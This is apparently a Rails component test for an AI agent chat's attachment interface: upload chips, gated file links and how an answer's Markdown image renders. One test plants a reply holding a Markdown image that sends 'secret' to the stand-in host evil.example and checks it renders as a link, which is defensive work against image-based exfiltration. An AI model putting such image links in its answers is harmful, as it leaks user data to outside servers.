require "test_helper"
require_relative "../support/chat_attachment_samples"

# [component] The shared chat's attachments slot filled (agent_chats/_attachments_slot,
# _attachments, _attachment_chip) and a turn's sent files (agent_chats/_sent_files):
# the composer gets the Attach button, the upload URL and the field name from the
# form's scope; a refused send's files come back as ready chips carrying their
# tokens; a sent image shows as a picture and a PDF or HEIC as a named chip, both
# through the gated path, never a blob URL; a chat whose composer passes no
# attachments gets nothing; a files-only turn draws no empty bubble; and an answer's
# Markdown image is a link, never an <img>.
class AgentChatAttachmentsComponentTest < ActionView::TestCase
  include ChatAttachmentSamples

  setup do
    AgentPerson.seed_owner!
    @alex = users(:alex)
  end

  def composer(attachments)
    { url: "/applications/turf-monster/chat", scope: :cto_chat, id: "cto-chat-form", error: nil, text: "", attachments: attachments }
  end

  def render_chat(messages: [], attachments: nil)
    render partial: "agent_chats/chat", locals: {
      agent_name: "Turf", stream: "cto_chat:turf-monster:1", channel: CtoChatChannel, messages: messages,
      composer: composer(attachments)
    }
  end

  test "[component] the filled slot: Attach, the upload URL, the scoped field name, and a refused send's files as ready chips" do
    blob = upload_sample(@alex, "pdf", name: "spec.pdf")
    render_chat(attachments: { upload_url: "/applications/turf-monster/chat/attachments", held: [ [ "tok-1", blob ] ] })

    assert_select "form#cto-chat-form [data-chat-attachments][data-upload-url='/applications/turf-monster/chat/attachments']" \
                  "[data-field-name='cto_chat[attachments][]'][data-max-files='10']"
    assert_select "[data-test='cto-chat-attach'] input[type='file'][multiple][accept*='application/pdf']"
    assert_select "[data-test='cto-chat-chip'][data-state='done']", 1 do
      assert_select "[data-test='cto-chat-chip-name']", text: "spec.pdf"
      assert_select "input[type='hidden'][name='cto_chat[attachments][]'][value='tok-1']"
      assert_select "[data-test='cto-chat-chip-remove'][aria-label='Remove spec.pdf']"
    end
    assert_select "form#cto-chat-form [data-chat-attachments] + div textarea", 1, "the slot sits above the input row"
  end

  test "[component] a chat whose composer passes no attachments draws no attachment UI" do
    render_chat

    assert_select "[data-chat-attachments]", 0
  end

  test "[component] a sent turn shows its files through the gated path: an image as a picture, a PDF and a HEIC as chips" do
    message = AgentMessages::WebIngest.new(user: @alex, cto: AppOwnership.cto_for_app("turf-monster"))
                                      .call("", attachments: %w[png pdf heic].map { |ext| sample_token(@alex, ext) })
    message.update!(status: "completed", response_text: "Look ![leak](https://evil.example/x.png?q=secret)", completed_at: Time.current)
    render_chat(messages: [ message.reload ])

    ids = message.attachments.map(&:id)
    assert_select "[data-test='cto-chat-sent-file'][data-kind='image'] img[src='/applications/turf-monster/chat/attachments/#{ids[0]}'][loading='lazy']"
    assert_select "[data-test='cto-chat-sent-file'][data-kind='pdf'] a[href='/applications/turf-monster/chat/attachments/#{ids[1]}']", text: /PDF\s*sample\.pdf/
    assert_select "[data-test='cto-chat-sent-file'][data-kind='image'] a[href='/applications/turf-monster/chat/attachments/#{ids[2]}']", text: /sample\.heic/
    assert_select "[data-test='cto-chat-sent']", 0, "a files-only turn draws no empty bubble"
    assert_not_includes rendered, "/rails/active_storage"
    assert_select "[data-test='cto-chat-reply'] img", 0, "an answer's image never loads on sight"
    assert_select "[data-test='cto-chat-reply'] a[href='https://evil.example/x.png?q=secret']", text: "leak"
  end
end
